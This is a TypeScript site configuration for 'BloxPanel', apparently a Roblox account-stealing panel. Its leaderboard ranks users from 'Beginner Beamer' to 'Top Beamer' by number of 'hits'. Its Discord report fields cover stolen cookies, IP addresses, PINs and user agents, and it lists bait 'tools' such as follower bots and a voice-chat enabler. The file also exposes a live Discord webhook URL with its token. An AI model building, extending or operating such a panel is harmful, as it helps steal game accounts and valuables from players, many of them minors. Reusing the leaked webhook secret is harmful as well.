export const siteConfig = {
  name: "BloxPanel",
  webhookUrl: "https://discord.com/api/webhooks/1499103473546035462/pSKamRGzu27_7p4kr2Spr5YZl7zylwmRuj4omBg02R3jVq6XbCCpbYl6gh4G6KkAv95z",
  discordInviteUrl: "https://discord.gg/your-invite-here",
};

// Referral signup heads-up notice. {username} will be replaced with the referrer.
// Edit the message here. The styling uses the active theme — no hard-coded colors.
export const referralNotice = {
  // Title shown above the message
  title: "Reminder",
  // {username} placeholder — referrer's username (without the @)
  message:
    "Join our discord server",
};

// Lovable usernames whose leaderboard row should always render with the
// animated golden gradient name. Lowercase. Add or remove freely — the
// database trigger reads this list via the `is_golden` flag, but for
// clarity the canonical list lives here too.
export const GOLDEN_USERNAMES: string[] = [
  "cheeky",
];

// NOTE: Discord emoji overrides used to live here. They now live as the
// `DISCORD_EMOJIS` secret on the edge function so updating them does NOT
// require a code change. The kept export below is purely informational so
// you can see the default key set the edge function uses.
export const discordEmojis = {
  robux:    "<:7116_Robux:1498757858731360349>",
  premium:  "<:Roblox_Premium_logosvg:1498785365308211201>",
  rap:      "💎",
  summary:  "📊",
  pending:  "⏳",
  voice:    "🎤",
  age:      "🪪",
  korblox:  "<:KorbloxDeathspeaker:1498762534784864387>",
  headless: "<:noFilter:1498762549762461909>",
  groups:   "👑",
  games:    "🎮",
  cookie:   "🍪",
  ip:       "🌐",
  user:     "👤",
  id:       "🆔",
  age_acct: "📅",
  friends:  "🫂",
  followers:"👥",
  following:"➡️",
  ua:       "🖥️",
  time:     "⏰",
  pin:      "🔐",
  owner:    "🏷️",
};

// Stock tutorial videos shown when a user picks "stock" video preference.
// Replace REPLACE_ME with real YouTube IDs as you record/pick them.
export const toolsConfig = {
  botFollowers: {
    youtubeUrl: "https://www.youtube.com/watch?v=REPLACE_ME",
  },
  copyGames: {
    youtubeUrl: "https://www.youtube.com/watch?v=REPLACE_ME",
  },
  copyClothes: {
    youtubeUrl: "https://www.youtube.com/watch?v=REPLACE_ME",
  },
  groupBotter: {
    youtubeUrl: "https://www.youtube.com/watch?v=REPLACE_ME",
  },
  vcEnabler: {
    youtubeUrl: "https://www.youtube.com/watch?v=REPLACE_ME",
  },
};

// Rank tiers (linear progression). Index 0 = lowest rank.
// `effect` controls the visual treatment of the rank label on the leaderboard
// and the dashboard. Available values:
//   "none"       — plain text, no effect
//   "shiny"      — animated metallic sheen sweeping across the text
//   "glowing"    — soft static glow in the active theme color
//   "pulsating"  — gently pulsing glow + scale
//   "glitchy"    — RGB-split glitch flicker
export type RankEffect = "none" | "shiny" | "glowing" | "pulsating" | "glitchy";

export const RANKS: { name: string; min: number; effect: RankEffect }[] = [
  { name: "Beginner Beamer", min: 0,    effect: "none" },
  { name: "Low Beamer",      min: 10,   effect: "none" },
  { name: "Novice Beamer",   min: 25,   effect: "none" },
  { name: "Average Beamer",  min: 50,   effect: "glowing" },
  { name: "Decent Beamer",   min: 100,  effect: "glowing" },
  { name: "Solid Beamer",    min: 200,  effect: "shiny" },
  { name: "Good Beamer",     min: 350,  effect: "shiny" },
  { name: "Advanced Beamer", min: 550,  effect: "pulsating" },
  { name: "Pro Beamer",      min: 800,  effect: "pulsating" },
  { name: "Top Beamer",      min: 1200, effect: "glitchy" },
];

export function getRank(hits: number) {
  let current = RANKS[0];
  let next: { name: string; min: number; effect: RankEffect } | null = null;
  for (let i = 0; i < RANKS.length; i++) {
    if (hits >= RANKS[i].min) {
      current = RANKS[i];
      next = RANKS[i + 1] ?? null;
    }
  }
  return { current, next };
}

// Maps a RankEffect to the CSS class that implements it. Defined here so the
// list of effects + their class names stays in one place.
export const RANK_EFFECT_CLASS: Record<RankEffect, string> = {
  none:      "",
  shiny:     "rank-effect-shiny",
  glowing:   "rank-effect-glowing",
  pulsating: "rank-effect-pulsating",
  glitchy:   "rank-effect-glitchy",
};
